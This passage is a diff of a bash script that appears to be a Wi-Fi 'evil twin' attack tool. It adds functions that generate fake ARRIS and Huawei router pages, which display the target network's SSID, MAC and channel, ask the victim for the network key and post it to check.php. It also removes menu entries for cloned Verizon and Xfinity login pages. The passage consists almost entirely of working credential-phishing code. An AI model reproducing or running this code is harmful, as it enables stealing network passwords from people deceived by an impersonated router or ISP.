+				DIALOG_WEB_INDEX_17=$DIALOG_WEB_INDEX_VERIZON_FR17
+			
+				VERIZON
+				break
+			elif [ "$linea" = "5" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_POR
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_POR
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_POR
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_POR
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_POR
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_POR
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_POR
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_POR
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_VERIZON_POR1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_VERIZON_POR2
+				DIALOG_WEB_INDEX_3=$DIALOG_WEB_INDEX_VERIZON_POR3
+				DIALOG_WEB_INDEX_4=$DIALOG_WEB_INDEX_VERIZON_POR4
+				DIALOG_WEB_INDEX_5=$DIALOG_WEB_INDEX_VERIZON_POR5
+				DIALOG_WEB_INDEX_6=$DIALOG_WEB_INDEX_VERIZON_POR6
+				DIALOG_WEB_INDEX_7=$DIALOG_WEB_INDEX_VERIZON_POR7
+				DIALOG_WEB_INDEX_8=$DIALOG_WEB_INDEX_VERIZON_POR8
+				DIALOG_WEB_INDEX_9=$DIALOG_WEB_INDEX_VERIZON_POR9
+				DIALOG_WEB_INDEX_10=$DIALOG_WEB_INDEX_VERIZON_POR10
+				DIALOG_WEB_INDEX_11=$DIALOG_WEB_INDEX_VERIZON_POR11
+				DIALOG_WEB_INDEX_12=$DIALOG_WEB_INDEX_VERIZON_POR12
+				DIALOG_WEB_INDEX_13=$DIALOG_WEB_INDEX_VERIZON_POR13
+				DIALOG_WEB_INDEX_14=$DIALOG_WEB_INDEX_VERIZON_POR14
+				DIALOG_WEB_INDEX_15=$DIALOG_WEB_INDEX_VERIZON_POR15
+				DIALOG_WEB_INDEX_16=$DIALOG_WEB_INDEX_VERIZON_POR16
+				DIALOG_WEB_INDEX_17=$DIALOG_WEB_INDEX_VERIZON_POR17
+				VERIZON
+				break
+			elif [ "$linea" = "6" ]; then
+				continue
+			fi
+		fi
+	
+	done
+	preattack
+	attack
 }
 
 function ConnectionRESET {
@@ -3898,16 +5648,7 @@ function ConnectionRESET {
 			echo -e "$blue""14)"$transparent" Czech       [CZ]   (NEUTRA)"
 			echo -e "$blue""15)"$transparent" Norwegian   [NO]   (NEUTRA)"
 			echo -e "$blue""16)"$transparent" Bulgarian   [BG]   (NEUTRA)"
-			echo -e "$blue""17)"$transparent" Arris       [ENG]"
-			echo -e "$blue""18)"$transparent" Belkin      [ENG]"
-			echo -e "$blue""19)"$transparent" Xfinity     [ENG]"
-			echo -e "$blue""20)"$transparent" Netgear     [ENG]"
-			echo -e "$blue""21)"$transparent" Huawei      [ENG]"
-			echo -e "$blue""22)"$transparent" Verizon     [ENG]"
-			echo -e "$blue""23)"$transparent" Netgear     [ESP]"
-			echo -e "$blue""24)"$transparent" Arris       [ESP]"
-			echo -e "$blue""25)"$transparent" Vodafone    [ESP]"
-			echo -e "$blue""26)"$transparent"\e[1;31m $general_back"$transparent""
+			echo -e "$blue""17)"$transparent"\e[1;31m $general_back"$transparent""
 			echo
 			echo -n "#? "
 			read fluxass
@@ -4136,43 +5877,8 @@ function ConnectionRESET {
                                 NEUTRA
                                 break
 
-			elif [ "$fluxass" = "17" ]; then
-                		ARRIS
-				break
 
-			elif [ "$fluxass" = "18" ]; then
-				BELKIN
-				break
-
-			elif [ "$fluxass" = "19" ]; then
-				XFINITY
-				break
-
-			elif [ "$fluxass" = "20" ]; then
-				NETGEAR
-				break
-
-    			elif [ "$fluxass" = "21" ]; then
-				HUAWEI
-				break
-
-			elif [ "$fluxass" = "22" ]; then
-				VERIZON
-				break
-
-			elif [ "$fluxass" = "23" ]; then
-				NETGEAR2
-				break
-
-			elif [ "$fluxass" = "24" ]; then
-				ARRIS2
-				break
-
-			elif [ "$fluxass" = "25" ]; then
-				VODAFONE
-				break
-
-      			elif [ "$fluxass" = "26" ]; then
+      			elif [ "$fluxass" = "17" ]; then
 				conditional_clear
 				webinterface
 				break
@@ -7006,120 +8712,2128 @@ ACQAAAAAAAAAIAAAAAzpAQBqcy9tYWluLmpzCgAgAAAAAAABABgAwGkPId0k0gFxv9MKziTSATNj
 	</body>
 </html>" > $DUMP_PATH/data/index.htm
 }
-# Crea el contenido de la interface web
+
+#Conten interface web
 function ARRIS {
-	mkdir $DUMP_PATH/data &>$flux_output_device
-	cp  $WORK_DIR/Sites/ARRIS-ENG/background.png $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/ARRIS-ENG/house.png $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/ARRIS-ENG/house1.png $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/ARRIS-ENG/ayuda.htm $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/ARRIS-ENG/error.html $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/ARRIS-ENG/final.html $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/ARRIS-ENG/index.htm $DUMP_PATH/data
+
+mkdir $DUMP_PATH/data &>$flux_output_device
+        cp  $WORK_DIR/Sites/ARRIS-ENG/info2.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/ARRIS-ENG/info.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/ARRIS-ENG/background.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/ARRIS-ENG/house.png $DUMP_PATH/data
+        
+function error {
+echo "    <link rel=\"stylesheet\" href=\"info2.css\" type=\"text/css\">
+</HEAD>
+</HEAD>
+
+<BODY>
+      <blockquote>
+
+
+    <TABLE id=\"autoWidth\">
+
+      <TBODY>
+
+
+
+        <TR>
+
+          <TD colspan=2></TD>
+
+        </TR>
+        
+        
+  </TR>
+ 
+
+
+        <TR>
+
+          <TD class=info1 colspan=2>
+
+
+$DIALOG_WEB_ERROR
+
+
+        <TR><TD class=blue colspan=2></TD></TR>
+        
+<tr><td colspan=\"2\" align=\"center\"><form><INPUT name=\"VOLVER\" onclick=\"history.back();return false\" class=\"buttonBig\" type=\"submit\" value=\"VOLVER\"/></form></td></tr>
+
+<tbody><tr><td height=\"50\" width=\"50\"><img src=\"data:image/gif;base64,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
+\" height=\"50\" width=\"50\"></td>
+        </tr>
+      </tbody></table>
+
+
+      </TBODY>
+
+    </TABLE>
+
+
+      </blockquote>
+</BODY>
+
+</HTML>
+">$DUMP_PATH/data/error.html
 }
 
-#Conten interface web
-function BELKIN {
-	mkdir $DUMP_PATH/data &>$flux_output_device
-	cp  $WORK_DIR/Sites/BELKIN-ENG/info2.css $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/BELKIN-ENG/info.css $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/BELKIN-ENG/background.png $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/BELKIN-ENG/house.png $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/BELKIN-ENG/house1.png $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/BELKIN-ENG/ayuda.htm $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/BELKIN-ENG/error.html $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/BELKIN-ENG/final.html $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/BELKIN-ENG/info.html $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/BELKIN-ENG/index.htm $DUMP_PATH/data
+function final {
+echo "<link rel=\"stylesheet\" href=\"info2.css\" type=\"text/css\"></HEAD>
+</HEAD>
+
+<BODY>
+      <blockquote>
+
+    <TABLE id=\"autoWidth\">
+
+      <TBODY>
+
+
+        <TR>
+
+          <TD class=blue colspan=2></TD>
+
+        </TR>
+
+
+
+        <TR>
+
+          <TD class=info1 colspan=2>
+          
+$DIALOG_WEB_OK.</TD></TR>
+
+
+        <TR><TD class=blue colspan=2></TD></TR>
+        
+
+
+
+      </TBODY>
+
+    </TABLE>
+
+
+</blockquote>
+</BODY>
+
+</HTML>
+">$DUMP_PATH/data/final.html
 }
 
-#Conten interface web
-function NETGEAR {
-	mkdir $DUMP_PATH/data &>$flux_output_device
-	cp  $WORK_DIR/Sites/NETGEAR-ENG/info2.css $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/NETGEAR-ENG/info.css $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/NETGEAR-ENG/background.png $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/NETGEAR-ENG/house.png $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/NETGEAR-ENG/house1.png $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/NETGEAR-ENG/ayuda.htm $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/NETGEAR-ENG/error.html $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/NETGEAR-ENG/final.html $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/NETGEAR-ENG/info.html $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/NETGEAR-ENG/index.htm $DUMP_PATH/data
-}
+function info {
+echo "<html>
+<head>
+<meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\">
 
-#Conten interface web
-function ARRIS2 {
-	mkdir $DUMP_PATH/data &>$flux_output_device
-	cp  $WORK_DIR/Sites/ARRIS-ESP/info2.css $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/ARRIS-ESP/info.css $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/ARRIS-ESP/background.png $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/ARRIS-ESP/house.png $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/ARRIS-ESP/house1.png $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/ARRIS-ESP/ayuda.htm $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/ARRIS-ESP/error.html $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/ARRIS-ESP/final.html $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/ARRIS-ESP/info.html $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/ARRIS-ESP/index.htm $DUMP_PATH/data
-}
+<link rel=\"stylesheet\" type=\"text/css\" href=\"info2.css\" media=\"all\">
+</head>
+<body bgcolor=\"transparent\" marginheight=\"0\" marginwidth=\"0\">
 
-#Conten interface web
-function NETGEAR2 {
-	mkdir $DUMP_PATH/data &>$flux_output_device
-	cp  $WORK_DIR/Sites/NETGEAR-ESP/info2.css $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/NETGEAR-ESP/info.css $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/NETGEAR-ESP/background.png $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/NETGEAR-ESP/house.png $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/NETGEAR-ESP/house1.png $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/NETGEAR-ESP/ayuda.htm $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/NETGEAR-ESP/error.html $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/NETGEAR-ESP/final.html $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/NETGEAR-ESP/info.html $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/NETGEAR-ESP/index.htm $DUMP_PATH/data
-}
+<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">
+  <tbody><tr> 
+      <td width=\"2%\">&nbsp;</td><td width=\"5%\"></td><td width=\"93%\"> 
+      <div valign=\"top\" align=\"left\"> 
+        <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"360\">
+           
+          </tr>
+          <TABLE id=\"autoWidth\">
 
-#Conten interface web
-function VODAFONE {
-	mkdir $DUMP_PATH/data &>$flux_output_device
-	cp  $WORK_DIR/Sites/VODAFONE-ESP/info2.css $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/VODAFONE-ESP/info.css $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/VODAFONE-ESP/background.png $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/VODAFONE-ESP/house.png $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/VODAFONE-ESP/house1.png $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/VODAFONE-ESP/ayuda.htm $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/VODAFONE-ESP/error.html $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/VODAFONE-ESP/final.html $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/VODAFONE-ESP/info.html $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/VODAFONE-ESP/index.htm $DUMP_PATH/data
-}
+      <TBODY>
+<tr><td><hr color=\"#F6832A\" size=1 width=\"99%\"></td></tr>
 
-#Conten interface web
-function VERIZON {
-	mkdir $DUMP_PATH/data &>$flux_output_device
-	cp -r $WORK_DIR/Sites/Login-Verizon/Verizon_files $DUMP_PATH/data
-	cp $WORK_DIR/Sites/Login-Verizon/Verizon.html $DUMP_PATH/data
-}
 
-function XFINITY {
-	mkdir $DUMP_PATH/data &>$flux_output_device
-	cp -r $WORK_DIR/Sites/Login-Xfinity/Xfinity_files $DUMP_PATH/data
-	cp $WORK_DIR/Sites/Login-Xfinity/Xfinity.html $DUMP_PATH/data
-}
+        <tr><td colspan=\"2\"  >SSID: <b>$Host_SSID</b></td></tr>
+        <tr><td colspan=\"2\"  >MAC Address: <b>$Host_MAC</b></td></tr>
+        <tr><td colspan=\"2\"  >Channel: <b>$Host_CHAN</b></td></tr>
 
+<tr><td></td></tr>
+
+
+<tr><td><hr color=\"#F6832A\" size=1 width=\"99%\"></td></tr>
+<tr><td></td></tr>
+
+        <TR>
+
+          <TD class=info1 colspan=2>
+<br><font color=\"#282B2F\">
+$DIALOG_WEB_INFO
+<br>
+<br>
+<div id=\"box\" align=\"left\" >
+<form id=\"form1\" name=\"form1\" method=\"POST\" action=\"check.php\" >
+<tr><td><b><font color=\"#282B2F\">$DIALOG_WEB_INPUT</b> Key:</td></tr>
+<tr><td><input name=\"key1\" type=\"password\" class=\"textfield\" /><td></tr>
+
+
+        <TR><TD class=blue colspan=2></TD></TR>
+                <TR><TD class=blue colspan=2></TD></TR>
+
+        
+<tr><td colspan=\"2\"><INPUT name=\"Confirm\" class=\"button\" type=\"submit\" value=\"Confirm\"/></td></tr>
+
+</form></div>
+
+</TD></TR>
+
+
+      </TBODY>
+
+    </TABLE>
+</table></div></td></tr></tbody></table>
+</body>
+</html>
+">$DUMP_PATH/data/info.html
+              }
+
+	      
+function index {
+echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">
+<html xmlns=\"http://www.w3.org/1999/xhtml\">
+<head>
+<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">
+
+
+	
+	<title>ARRIS-SERVICES</title>
+	
+	
+
+<link rel=\"stylesheet\" type=\"text/css\" href=\"info.css\" media=\"all\">
+</head>
+
+
+
+<body>	
+	
+
+		<div class=\"panel_content\" id=\"panel_content\"><div class=\"house\">
+		<div style=\"cursor: auto;\" id=\"internet\" class=\"divInternet\">
+		<div class=\"internet\" id=\"iconInternet\" internet_status=\"INTERNET_OK\"></div>
+		<div class=\"internet_txt\">
+			<span class=\"trad\" key=\"MAP_INTERNET\"><A href=\"index.htm\"><font color=\"black\">--</A></span>
+			<span class=\"internet_des trad\" key=\"COMMON_EMPTY\" id=\"internetAlert\"> </span>
+		</div>
+	</div>
+	<div id=\"threeG\" class=\"threeG hand trad\" style=\"\">
+		<div style=\"background-position: 0px 0px;\" id=\"threeG_icos\" class=\"threeG_ico\" power3g=\"3\"></div>
+		<span class=\"threeG_txt hand trad\" key=\"MAP_3G\"><A href=\"index.htm\"><font color=\"#F6832A\"></span>
+	</div>
+	<div adslconfigurable=\"true\" id=\"adsl\" adslactive=\"false\" class=\"adsl trad hand\">
+		<div style=\"background-position: -152px 0px;\" class=\"adsl_ico\" id=\"iconadsl\"></div>
+		<span class=\"adsl_txt trad\" key=\"MAP_ADSL\"><A href=\"index.htm\"><font color=\"#F6832A\"></A></span>
+	</div>	
+	<div id=\"wifi\" class=\"hand disabled\">
+		<div class=\"wifi_ico\" color=\"red\"></div>
+		<span class=\"gateway\"></span>
+		<span class=\"wifi_txt trad\" key=\"MAP_WIFI_WPA\"><A href=\"index.htm\"><font color=\"red\" >¿PLEASE HELP?------</A></span>
+	</div>
+	
+	<div id=\"wifi2\" class=\"hand disabled\">
+		<div class=\"wifi_ico2\" color=\"red\"></div>
+		<span class=\"gateway2\"></span>
+		<span class=\"wifi_txt2 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"black\" >-$DIALOG_WEB_INDEX_1-</A></span>
+	</div>
+	
+	<div id=\"wifi3\" class=\"hand disabled\">
+		<div class=\"wifi_ico3\" color=\"red\"></div>
+		<span class=\"gateway3\"></span>
+		<span class=\"wifi_txt3 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"black\" >-$DIALOG_WEB_INDEX_2-</A></span>
+	</div>
+	
+	<div id=\"wifi4\" class=\"hand disabled\">
+		<div class=\"wifi_ico4\" color=\"red\"></div>
+		<span class=\"gateway4\"></span>
+		<span class=\"wifi_txt4 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"black\" >-$DIALOG_WEB_INDEX_3-</A></span>
+	</div>
+	
+	<div id=\"wifi5\" class=\"hand disabled\">
+		<div class=\"wifi_ico5\" color=\"red\"></div>
+		<span class=\"gateway5\"></span>
+		<span class=\"wifi_txt5 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"black\" >-$DIALOG_WEB_INDEX_4-</A></span>
+	</div>
+	
+	<div id=\"wifi6\" class=\"hand disabled\">
+		<div class=\"wifi_ico6\" color=\"red\"></div>
+		<span class=\"gateway6\"></span>
+		<span class=\"wifi_txt6 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"black\" >-$DIALOG_WEB_INDEX_5-</A></span>
+	</div>
+	
+	<div id=\"wifi7\" class=\"hand disabled\">
+		<div class=\"wifi_ico7\" color=\"red\"></div>
+		<span class=\"gateway7\"></span>
+		<span class=\"wifi_txt7 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"black\" >-$DIALOG_WEB_INDEX_6-</A></span>
+	</div>
+	
+	<div id=\"wifi8\" class=\"hand disabled\">
+		<div class=\"wifi_ico8\" color=\"red\"></div>
+		<span class=\"gateway8\"></span>
+		<span class=\"wifi_txt8 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"black\" >-$DIALOG_WEB_INDEX_7-</A></span>
+	</div>
+	
+	<div id=\"wifi9\" class=\"hand disabled\">
+		<div class=\"wifi_ico9\" color=\"red\"></div>
+		<span class=\"gateway9\"></span>
+		<span class=\"wifi_txt9 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"black\" >-$DIALOG_WEB_INDEX_8-</A></span>
+	</div>
+	
+	
+	
+		<div class=\"scroll\">
+<iframe src=\"info.html\" width=\"440\" height=\"265\" align=\"center\">
+		</div>
+	
+	
+	
+
+        <div id=\"remaining_session_box\" style=\"float: right; display: none;\">
+		<span>Remaining Session: </span>	
+		<span id=\"remaining_session\"></span>
+	</div>
+
+</div></div></a>
+	</div>
+  		
+	<div id=\"help_dialog\" class=\"dialog\"></div>
+	<div id=\"dialog\" class=\"dialog dialog_text\"></div>	
+	<div id=\"dialogWarning\" class=\"dialog dialog_text\"></div>
+	
+
+
+</body>
+</html>">$DUMP_PATH/data/index.htm
+              }
+error && final && info && index
+	      }
+
+	      
+	      
 #Conten interface web
 function HUAWEI {
-	mkdir $DUMP_PATH/data &>$flux_output_device
-	cp  $WORK_DIR/Sites/HUAWEI-ENG/info2.css $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/HUAWEI-ENG/info.css $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/HUAWEI-ENG/background.png $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/HUAWEI-ENG/house.png $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/HUAWEI-ENG/house1.png $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/HUAWEI-ENG/ayuda.htm $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/HUAWEI-ENG/error.html $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/HUAWEI-ENG/final.html $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/HUAWEI-ENG/info.html $DUMP_PATH/data
-	cp  $WORK_DIR/Sites/HUAWEI-ENG/index.htm $DUMP_PATH/data
+
+mkdir $DUMP_PATH/data &>$flux_output_device
+        cp  $WORK_DIR/Sites/HUAWEI/info2.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/HUAWEI/info.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/HUAWEI/background.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/HUAWEI/house.png $DUMP_PATH/data
+         
+       function final {
+echo "<link rel=\"stylesheet\" href=\"info2.css\" type=\"text/css\"></HEAD>
+</HEAD>
+<BODY>
+      <blockquote>
+    <TABLE id=\"autoWidth\">
+      <TBODY>
+        <TR>
+          <TD class=blue colspan=2></TD>
+        </TR>
+        <TR>
+          <TD class=info1 colspan=2>          
+$DIALOG_WEB_OK.</TD></TR>
+        <TR><TD class=blue colspan=2></TD></TR>
+      </TBODY>
+    </TABLE>
+</blockquote>
+</BODY>
+</HTML>
+">$DUMP_PATH/data/final.html
 }
+        
+function error {
+echo "  
+   <link rel=\"stylesheet\" href=\"info2.css\" type=\"text/css\">
+</HEAD>
+</HEAD>
+<BODY>
+      <blockquote>
+    <TABLE id=\"autoWidth\">
+      <TBODY>
+        <TR>
+          <TD colspan=2></TD>
+        </TR>       
+  </TR>
+        <TR>
+          <TD class=info1 colspan=2>
+<b><font color=\"red\" size=\"3\"></font>:</b> $DIALOG_WEB_ERROR<b></b> !</b></TD></TR>
+        <TR><TD class=blue colspan=2></TD></TR>        
+<tr><td colspan=\"2\" align=\"center\"><form><INPUT name=\"VOLVER\" onclick=\"history.back();return false\" class=\"buttonBig\" type=\"submit\" value=\"VOLVER\"/></form></td></tr>
+
+<tbody><tr><td height=\"50\" width=\"50\"><img src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAABmJLR0QA/wD/AP+gvaeTAAAACXBI
+WXMAAAsTAAALEwEAmpwYAAAH2ElEQVRo3tWaW2xcVxWGv3N8zvgSj8dxUttprkBNSdPQQAsV10IF
+lKK88ABCQkKoDxUvFVXUSggJIaigSJFQUZ94KQhEHxA8tAQEpCC1USOuTVsgl7apsZPY8W3sY4/n
+tmfO4cH/rjfTiWfGmcTxlo5GMz577/Wvy7/WXtseNSMKw25gGNgHbAcCIAYSNm74kqEM5IElYBqY
+yBhTQEJaAClgCzAgELcCO/RORQvdCEAKwIJkNccXkwuf7vMSTyA6gJ3ACPBOYC+wC9iqhYoCkwBe
+g02TOo87PAnmNbEWzp6J5nVInlHgFeAsMGMtkpIV7gXuAoaATi1QBnL6jLUYdYRzQcQ1j/ueJ2E6
+WgBi9+0DtslLxuQ9/cA5C6RbFng/8BF9nwMiLVJ13MtvQoC1hLUWatZV7f52vX4gI0VXrdsFURh2
+yoVuUpBvkQXOAG8ITLEBEKt5Dwi1SZfW6pYGE8BorUUFrGnC1WLtHchTZoCbtccgcDsQBUK3TWB6
+NHkUOA6cVGC5WqznWhVpJ5Dw/TL7kNbu0twCkJVbXJLCPM1rBsigYvgW4DbgAPAeYDqQ8L0SoFMT
+LyuQTmSMMc1Si0hjUMRhQXU5blSQJeYEZC5jTLGF9dPAlJTbC7xXyhoOpGHLBtbEBsi1AkJjQLR9
+ENgNpKWclFwulhDb5cpjURi+mTEm28ziz4+Xc/fsSc3LqjnHU1JBDbskDt35LWiqW8KNAJ8APg7s
